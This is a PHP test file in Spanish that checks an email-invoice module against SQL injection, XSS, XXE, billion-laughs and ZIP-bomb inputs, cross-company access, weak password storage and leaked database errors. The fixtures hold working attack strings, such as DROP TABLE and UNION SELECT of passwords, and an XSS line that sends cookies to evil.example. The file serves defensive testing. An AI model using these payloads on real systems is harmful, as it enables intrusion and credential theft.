<?php
/**
 * Correo frente a entradas hostiles.
 *
 * Dos clases de pruebas. Las de RESISTENCIA pasan hoy y tienen que seguir
 * pasando: inyección SQL por cada texto y cada número que llega a los modelos,
 * XXE y billion laughs en los XML adjuntos, recorrido de rutas en los nombres
 * de adjuntos, permisos declarados para cada ruta. Las marcadas con código
 * (S1…S7) son huecos abiertos, descritos en docs/REVISION_CORREO.md.
 *
 * Las cargas llevan la marca ZQX9: si aparece dentro del texto SQL, algo se
 * interpoló en vez de viajar como parámetro.
 *
 * Uso: php tests/CorreoSeguridadTest.php
 */
require_once __DIR__ . '/soporte/CorreoSoporte.php';

Prueba::iniciar('Correo frente a entradas hostiles');

const MARCA = 'ZQX9';

function cargasSql(): array
{
    return [
        "' OR '1'='1' -- ZQX9",
        '1; DROP TABLE correo_indice; -- ZQX9',
        "%' UNION SELECT usuario, password FROM correo_cuentas -- ZQX9",
        "\\'); DELETE FROM correo_procesados; # ZQX9",
        "ZQX9' AND SLEEP(5) AND '1'='1",
        "ZQX9\0' OR 1=1 --",
        "𝐙𝐐𝐗 ZQX9' OR 1=1 -- ",
        'ZQX9' . str_repeat("'", 2000),
        "ZQX9`; SELECT LOAD_FILE('C:/Windows/win.ini'); --",
    ];
}

/** Ningún SQL lleva la marca, y cada «?» tiene su parámetro. */
function sinInterpolar(string $contexto): void
{
    foreach (Soporte::$pdo->sentencias as $s) {
        verificar(strpos($s['sql'], MARCA) === false, "{$contexto}: la carga quedó dentro del SQL: " . substr($s['sql'], 0, 120));
        igual(substr_count($s['sql'], '?'), count($s['params']), "{$contexto}: marcadores y parámetros");
    }
}

// ── Inyección SQL ──────────────────────────────────────────────────────────

Prueba::caso('índice: ningún texto, ámbito, carpeta, mes, fecha, límite o número llega interpolado', function () {
    $revisadas = 0;
    foreach (cargasSql() as $i => $carga) {
        foreach (['asunto', 'remitente', 'asunto_remitente', 'todo', $carga] as $ambito) {
            Soporte::$pdo->reiniciar();
            $indice = (new CorreoIndice())->setCuenta(3);
            $indice->buscar($carga, $ambito, $carga, $carga, $carga, $carga, $carga, $carga, $carga);
            $indice->buscar('proveedor@' . $carga . '.cr', $ambito, 0);
            $indice->buscarPorNumero($carga . ' 00100001010000012345', $carga, $carga, $carga, $carga, $carga);
            $indice->carpetasConMensajesDesde($carga);
            $indice->guardarAdjuntosPorMensaje($carga, $carga, $carga);
            $indice->guardarDestinatariosPorMensaje($carga, $carga, $carga, $carga);
            $indice->insertarLote($carga, $carga, $carga, [['uid' => 1, 'asunto' => $carga, 'remitente' => $carga]]);
            $indice->guardarEstadoCarpeta($carga, $carga, $carga, $carga, $carga, $carga, true);
            sinInterpolar("carga {$i}, ámbito " . substr($ambito, 0, 12));
            $revisadas += count(Soporte::$pdo->sentencias);
        }
    }
    verificar($revisadas > 300, "se revisaron {$revisadas} sentencias");
});

Prueba::caso('lotes, incidencias, bandeja, marcas y cola de captura: todo como parámetro', function () {
    foreach (cargasSql() as $i => $carga) {
        Soporte::$pdo->reiniciar();
        $lotes = new CorreoLote();
        $lotes->historialIncidencias($carga, ['q' => $carga, 'tipo' => $carga, 'ver' => $carga], $carga, $carga);
        $lotes->idsIncidencias($carga, ['q' => $carga, 'tipo' => $carga], $carga);
        $lotes->incidencias($carga, $carga);
        $lotes->estimar($carga, '2026-09-01', '2026-09-02', '', $carga);
        lanza(fn() => $lotes->estimar(3, '2026-09-01', '2026-09-02', $carga), 'válido');
        $lotes->descartarIncidencias([$carga, '5'], $carga, $carga);
        $lotes->restaurarIncidencias([$carga, 6]);
        $lotes->incidencia($carga, 0, $carga, $carga, ['asunto' => $carga]);

        $bandeja = new CorreoBandeja();
        $bandeja->getByIds([$carga, 1], $carga);
        $bandeja->getPorUidHash($carga, $carga);
        $bandeja->rutasEnUsoFuera([$carga], [$carga, 2]);
        $bandeja->crear(['uid_correo' => $carga, 'remitente' => $carga, 'asunto' => $carga, 'estado' => $carga,
                         'origen' => $carga, 'proveedor' => $carga, 'hash_xml' => $carga]);

        (new CorreoProcesado())->marcar($carga, $carga);
        (new CorreoProcesado())->desmarcar([$carga], $carga);
        (new CorreoCapturaAutomatica())->registrarNuevos(3, $carga, $carga, [['uid' => 5, 'timestamp' => time()]]);
        (new CorreoCapturaAutomatica())->finalizar($carga, $carga, $carga, $carga);
        (new CorreoCuenta())->asignarSociedades($carga, [$carga, '4']);

        sinInterpolar("carga {$i}");
    }
});

Prueba::caso('listar desde el navegador: el texto hostil viaja como parámetro hasta el índice', function () {
    foreach (cargasSql() as $i => $carga) {
        Soporte::limpiarPeticion();
        Soporte::$pdo->respuestas['SELECT COUNT(*) FROM correo_cuentas'] = [['c' => 1]];
        Soporte::$pdo->respuestas['FROM correo_cuentas WHERE id = ?'] = [[
            'id' => '3', 'host' => 'mail.test.invalid', 'puerto' => '993', 'usuario' => 'u@x', 'password' => base64_encode('p'),
            'carpeta' => 'INBOX', 'dias_atras' => '0', 'indice_retencion_dias' => '0', 'solo_no_leidos' => '0',
        ]];
        Soporte::$pdo->respuestas['SELECT sociedad_id FROM correo_cuenta_sociedades'] = [['sociedad_id' => '4']];
        Soporte::$pdo->respuestas['SELECT COUNT(*) FROM correo_indice'] = [['c' => 1]];
        $_POST = ['cuenta_id' => '3', 'texto' => $carga, 'ambito' => 'asunto_remitente', 'mes' => $carga,
                  'pagina' => $carga, 'dias' => $carga, 'numero_contexto' => $carga, 'origen_busqueda' => $carga];
        [$codigo] = (new CorreoControllerSonda())->responder('listar');
        igual(200, $codigo, "carga {$i} responde");
        sinInterpolar("listar, carga {$i}");
    }
});

// ── XSS: la vista, pintada de verdad ───────────────────────────────────────

function pintarVista(array $datos): string
{
    $datos += [
        'imapDisponible' => true, 'configExiste' => true, 'configurado' => true, 'hayCuentasEnSistema' => true,
        'configResumen' => ['host' => 'mail.x', 'usuario' => 'u', 'carpeta' => 'INBOX', 'dias_atras' => 14, 'solo_no_leidos' => false],
        'cuentas' => [['id' => 3, 'nombre' => 'Facturación', 'usuario' => 'u', 'host' => 'h', 'puerto' => 993, 'carpeta' => 'INBOX']],
        'cuentaActivaId' => 3, 'sociedadActiva' => ['id' => 4, 'nombre' => 'EMPRESA', 'cedula' => '3101'],
        'bandeja' => [], 'historial' => [], 'conteo' => [], 'carpetasCorreo' => [], 'modoCorreo' => 'facturas',
        'loteGeneral' => null, 'navDoc' => null, 'buscarInicial' => '', 'buscarFecha' => '', 'abrirCorreoUid' => 0,
        'abrirCorreoCarpeta' => '', 'forzarSync' => false,
    ];
    $pintar = static function (array $__datos) {
        extract($__datos);
        ob_start();
        include __DIR__ . '/../app/views/correo/index.php';
        return ob_get_clean();
    };
    return $pintar($datos);
}

/** La línea del HTML donde empieza esa variable de JavaScript. */
function lineaDeScript(string $html, string $variable): string
{
    foreach (explode("\n", $html) as $linea) {
        if (strpos($linea, 'var ' . $variable . ' =') !== false) {
            return $linea;
        }
    }
    throw new FalloDePrueba("la vista no declara {$variable}");
}

Prueba::caso('XSS: lo que llega de la URL y de la bandeja sale escapado', function () {
    $ataque = '</script><img src=x onerror=alert(document.cookie)>"\'';
    $html = pintarVista([
        'buscarInicial' => $ataque, 'abrirCorreoCarpeta' => $ataque, 'buscarFecha' => $ataque,
        'bandeja' => [[
            'id' => 1, 'estado' => 'pendiente"><script>alert(1)</script>', 'remitente' => $ataque, 'asunto' => $ataque,
            'numero_corto' => $ataque, 'proveedor' => $ataque, 'fecha_emision' => $ataque, 'total' => '1',
            'archivo_pdf' => 'C:\\x\\' . $ataque . '.pdf', 'origen' => 'automatica',
        ]],
        'sociedadActiva' => ['id' => 4, 'nombre' => $ataque, 'cedula' => '1'],
        'configExiste' => false,
    ]);
    // Dentro de una cadena de JavaScript el <img> es texto inerte, siempre que
    // no pueda cerrar el <script>: eso es lo único que se admite.
    foreach (explode("\n", $html) as $linea) {
        if (strpos($linea, '<img src=x onerror') !== false) {
            verificar(preg_match('/^\s*var [A-Z_]+ = "/', $linea) === 1, 'un <img> hostil fuera de una cadena JS: ' . trim($linea));
        }
        verificar(stripos($linea, '</script><img') === false, 'algo cerró el <script>: ' . trim($linea));
    }
    igual(0, substr_count($html, '<script>alert(1)</script>'), 'ningún <script> hostil sin escapar');
    verificar(strpos(lineaDeScript($html, 'BUSCAR_INICIAL'), '</script') === false, 'el término de búsqueda no cierra el script');
});

Prueba::caso('[S1] XSS almacenado: una carpeta del buzón llamada "<" con subcarpeta "script>…" no cierra el <script>', function () {
    // Cualquiera con acceso al buzón (Outlook, webmail) puede crear la carpeta
    // "<" y dentro "script><svg onload=…>". El índice la guarda tal cual y el
    // nombre legible cambia los puntos de la jerarquía por barras:
    $carpeta = 'INBOX.<.script><svg onload=alert(1)>';
    igual('</script><svg onload=alert(1)>', MailFetcher::nombreLegibleEstatico($carpeta), 'el nombre legible');
    $html = pintarVista(['carpetasCorreo' => [[
        'carpeta' => $carpeta, 'nombre' => MailFetcher::nombreLegibleEstatico($carpeta), 'mensajes' => 1,
        'ultima_sync' => null, 'delimitador' => '.', 'seleccionable' => true, 'indexada' => true, 'no_leidos' => null,
    ]]]);
    verificar(stripos(lineaDeScript($html, 'CARPETAS_INICIALES'), '</script') === false,
        'antes json_encode(…, JSON_UNESCAPED_SLASHES) sin JSON_HEX_TAG deja "</script><svg onload=…>" en el HTML');
});

Prueba::caso('[S2] XSS almacenado: el nombre de un buzón no cierra el <script> del lote en curso', function () {
    $html = pintarVista(['modoCorreo' => 'descargas', 'loteGeneral' => Soporte::filaLote([
        'cuenta_nombre' => '</script><script>fetch("//evil.example/?c="+document.cookie)</script>',
    ])]);
    verificar(stripos(lineaDeScript($html, 'lote'), '</script') === false, 'antes el nombre del buzón corta el script');
});

// ── Acceso entre empresas ──────────────────────────────────────────────────

Prueba::caso('un buzón de otra empresa no se puede usar mandando su id', function () {
    Soporte::$pdo->respuestas['SELECT COUNT(*) FROM correo_cuentas'] = [['c' => 1]];
    Soporte::$pdo->respuestas['SELECT sociedad_id FROM correo_cuenta_sociedades'] = [['sociedad_id' => '9']];
    Soporte::$pdo->respuestas['FROM correo_cuentas WHERE id = ?'] = [['id' => '8', 'host' => 'h', 'usuario' => 'u',
        'password' => base64_encode('p'), 'puerto' => '993', 'carpeta' => 'INBOX', 'dias_atras' => '0',
        'indice_retencion_dias' => '0', 'solo_no_leidos' => '0']];
    foreach (['listar', 'sincronizar', 'contenido', 'generalIncidencias'] as $accion) {
        $_POST = ['cuenta_id' => '8', 'uid' => '5'];
        [$codigo] = (new CorreoControllerSonda())->responder($accion);
        igual(422, $codigo, $accion);
    }
    $_POST = ['id' => '8'];
    igual(422, (new CorreoControllerSonda())->responder('cuentaUsar')[0], 'cuentaUsar');
});

Prueba::caso('pausar, cancelar y ver el estado de un lote ajeno responde 404', function () {
    Soporte::$pdo->respuestas['SELECT l.*, c.nombre AS cuenta_nombre, c.usuario'] = [Soporte::filaLote(['sociedad_id' => '9'])];
    foreach (['generalEstado', 'generalPausar', 'generalCancelar', 'generalReanudar'] as $accion) {
        $_POST = ['lote_id' => '50'];
        igual(404, (new CorreoControllerSonda())->responder($accion)[0], $accion);
    }
    igual(0, Soporte::$pdo->contar('UPDATE correo_lotes SET estado'), 'nada cambió');
});

Prueba::caso('[S3] procesar un lote ajeno por id responde 404 y no expone sus datos', function () {
    Soporte::$pdo->respuestas['SELECT l.*, c.nombre AS cuenta_nombre, c.usuario'] = [Soporte::filaLote([
        'sociedad_id' => '9', 'estado' => 'completado', 'cuenta_usuario' => 'tesoreria@otra-empresa.example',
        'sociedad_cedula' => '3101999999',
    ])];
    $_POST = ['lote_id' => '50'];
    [$codigo, $cuerpo] = (new CorreoControllerSonda())->responder('generalProcesar');
    verificar(strpos(json_encode($cuerpo), 'otra-empresa') === false,
        'antes devuelve el buzón, la cédula y las incidencias del lote de otra empresa');
    igual(404, $codigo, 'código');
});

Prueba::caso('[S4] descartar o restaurar incidencias por id solo alcanza las del buzón de la empresa en curso', function () {
    Soporte::$pdo->respuestas['SELECT COUNT(*) FROM correo_cuentas'] = [['c' => 1]];
    Soporte::$pdo->respuestas['FROM correo_cuentas WHERE id = ?'] = [['id' => '3', 'host' => 'h', 'usuario' => 'u',
        'password' => base64_encode('p'), 'puerto' => '993', 'carpeta' => 'INBOX', 'dias_atras' => '0',
        'indice_retencion_dias' => '0', 'solo_no_leidos' => '0']];
    Soporte::$pdo->respuestas['SELECT sociedad_id FROM correo_cuenta_sociedades'] = [['sociedad_id' => '4']];
    $_POST = ['cuenta_id' => '3', 'ids' => '[900001, 900002]'];
    (new CorreoControllerSonda())->responder('incidenciasDescartar');
    $update = Soporte::$pdo->de('UPDATE correo_incidencias')[0]['sql'] ?? '';
    verificar(stripos($update, 'cuenta_id') !== false || stripos($update, 'sociedad_id') !== false,
        'antes el UPDATE es "WHERE id IN (…)" a secas: ids de otra empresa se descartan igual');
});

// ── Denegación de servicio por adjuntos ────────────────────────────────────

Prueba::caso('[S5] bomba ZIP: un adjunto de pocos KB no se descomprime a decenas de MB ni a miles de archivos', function () {
    $zipRuta = Soporte::carpetaTemporal() . DIRECTORY_SEPARATOR . 'facturas.zip';
    $zip = new ZipArchive();
    $zip->open($zipRuta, ZipArchive::CREATE);
    $zip->addFromString('FE-grande.xml', str_repeat('A', 24 * 1048576));
    for ($i = 0; $i < 800; $i++) {
        $zip->addFromString("FE-{$i}.xml", '<x/>');
    }
    $zip->close();
    $kb = (int) ceil(filesize($zipRuta) / 1024);

    $antes = memory_get_usage();
    $adjuntos = Soporte::privado(new MailFetcher([]), 'extraerDeZip', file_get_contents($zipRuta), 'facturas.zip');
    $pico = round((memory_get_peak_usage() - $antes) / 1048576, 1);
    foreach (rutasDeAdjuntos($adjuntos) as $ruta) {
        Soporte::anotarTemporal($ruta);
    }
    $bytes = array_sum(array_map('filesize', rutasDeAdjuntos($adjuntos)));

    verificar(count($adjuntos) <= 100 && $bytes <= 15 * 1048576,
        sprintf('antes un ZIP de %d KB dejó %d archivos y %.1f MB en storage/correo/tmp (pico de memoria +%.1f MB); '
            . 'con una entrada de 600 MB el proceso muere por memory_limit', $kb, count($adjuntos), $bytes / 1048576, $pico));
});

Prueba::caso('XXE: una entidad externa en el XML adjunto no lee archivos del servidor', function () {
    $dir = Soporte::carpetaTemporal();
    $secreto = $dir . DIRECTORY_SEPARATOR . 'secreto.txt';
    file_put_contents($secreto, 'SECRETO-' . MARCA);
    $xml = $dir . DIRECTORY_SEPARATOR . 'FE.xml';
    file_put_contents($xml, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///'
        . str_replace('\\', '/', $secreto) . '">]><FacturaElectronica><Clave>&x;</Clave>'
        . '<NumeroConsecutivo>&x;</NumeroConsecutivo><Emisor><Nombre>&x;</Nombre></Emisor></FacturaElectronica>');

    $clasificacion = (new CorreoControllerSonda())->privado('clasificarXml', $xml);
    verificar(strpos(json_encode($clasificacion), MARCA) === false, 'la clasificación no trae el archivo');
    try {
        $datos = XmlInvoiceParser::parseCfdiFromFile($xml);
        verificar(strpos(json_encode($datos), MARCA) === false, 'el parser no trae el archivo');
    } catch (Throwable $e) {
        verificar(strpos($e->getMessage(), MARCA) === false, 'ni en el mensaje de error');
    }
});

Prueba::caso('billion laughs: el XML de entidades anidadas no se expande', function () {
    $dir = Soporte::carpetaTemporal();
    $xml = '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY l0 "ja">';
    for ($i = 1; $i <= 9; $i++) {
        $xml .= "<!ENTITY l{$i} \"" . str_repeat('&l' . ($i - 1) . ';', 10) . '">';
    }
    $xml .= ']><FacturaElectronica><Clave>&l9;</Clave></FacturaElectronica>';
    file_put_contents($dir . '/b.xml', $xml);
    $antes = memory_get_peak_usage();
    lanza(fn() => XmlInvoiceParser::parseCfdiFromFile($dir . '/b.xml'), 'parsear');
    verificar(memory_get_peak_usage() - $antes < 8 * 1048576, 'sin explosión de memoria');
});

// ── Credenciales y fuga de información ─────────────────────────────────────

Prueba::caso('[S6] la contraseña del buzón no se guarda en un formato que se lee sin clave', function () {
    (new CorreoCuenta())->crear(['nombre' => 'N', 'host' => 'h', 'usuario' => 'u', 'password' => 'Clave-Real-2026!']);
    $guardada = (string) Soporte::$pdo->de('INSERT INTO correo_cuentas')[0]['params'][4];
    verificar(base64_decode($guardada, true) !== 'Clave-Real-2026!',
        'antes es base64: cualquiera con lectura de la base, de un respaldo o del app.log (Model::logError vuelca los parámetros) la tiene');
});

Prueba::caso('[S7] un error de la base no llega crudo al navegador', function () {
    $falla = new class extends CorreoLote {
        public function estimar($cuentaId, $desde, $hasta, $correoBusqueda = '', $sociedadId = null)
        {
            throw new PDOException("SQLSTATE[42S22]: Column not found: 1054 Unknown column 'i.adjuntos' in 'where clause'");
        }
    };
    Soporte::$pdo->respuestas['SELECT COUNT(*) FROM correo_cuentas'] = [['c' => 1]];
    Soporte::$pdo->respuestas['FROM correo_cuentas WHERE id = ?'] = [['id' => '3', 'host' => 'h', 'usuario' => 'u',
        'password' => base64_encode('p'), 'puerto' => '993', 'carpeta' => 'INBOX', 'dias_atras' => '0',
        'indice_retencion_dias' => '0', 'solo_no_leidos' => '0']];
    Soporte::$pdo->respuestas['SELECT sociedad_id FROM correo_cuenta_sociedades'] = [['sociedad_id' => '4']];
    $sonda = new CorreoControllerSonda();
    $sonda->modelos['CorreoLote'] = $falla;
    $_POST = ['cuenta_id' => '3', 'fecha_desde' => '2026-09-01', 'fecha_hasta' => '2026-09-02'];
    [, $cuerpo] = $sonda->responder('generalEstimar');
    verificar(strpos((string) $cuerpo['message'], 'SQLSTATE') === false, 'antes responde: ' . $cuerpo['message']);
});

// ── Lo que ya está bien y tiene que seguir así ─────────────────────────────

Prueba::caso('cada ruta POST de Correo declara un permiso real (ni libre ni pública)', function () {
    preg_match_all("#\\\$router->(get|post)\\('(/correo[^']*)'#", file_get_contents(__DIR__ . '/../app/config/routes.php'), $m, PREG_SET_ORDER);
    verificar(count($m) >= 25, 'se encontraron las rutas de correo');
    foreach ($m as [, $metodo, $uri]) {
        $regla = Permisos::reglaDeRuta($metodo, $uri);
        verificar(is_array($regla), "{$metodo} {$uri} no está en config/permisos.php");
        $permiso = $regla['permiso'] ?? null;
        verificar(is_string($permiso) && strpos($permiso, 'correo.') === 0, "{$metodo} {$uri} exige {$permiso}");
    }
    igual('correo.configurar', Permisos::reglaDeRuta('POST', '/correo/cuentas/guardar')['permiso'], 'dar de alta buzones es de configuración');
    // La carpeta compartida ya no se elige desde aquí: los documentos van a SharePoint.
    foreach (['/correo/config', '/correo/carpetas', '/correo/selector/abrir', '/correo/selector/estado'] as $vieja) {
        verificar(Permisos::reglaDeRuta('POST', $vieja) === null, "POST {$vieja} ya no existe");
    }
});

Prueba::caso('sin token ni cabeceras de origen propio, un POST de Correo se rechaza', function () {
    $_SESSION['csrf_token'] = 'token-de-verdad';
    $_SERVER['HTTP_X_CSRF_TOKEN'] = 'token-robado-viejo';
    igual('token_invalido', Csrf::motivoRechazo(), 'token equivocado');
    unset($_SERVER['HTTP_X_CSRF_TOKEN']);
    igual('sin_prueba', Csrf::motivoRechazo(), 'sin nada');
    $_SERVER['HTTP_SEC_FETCH_SITE'] = 'cross-site';
    $_POST['csrf_token'] = 'token-de-verdad';
    igual('otro_sitio', Csrf::motivoRechazo(), 'desde otro sitio, aunque traiga el token');
});

Prueba::terminar();
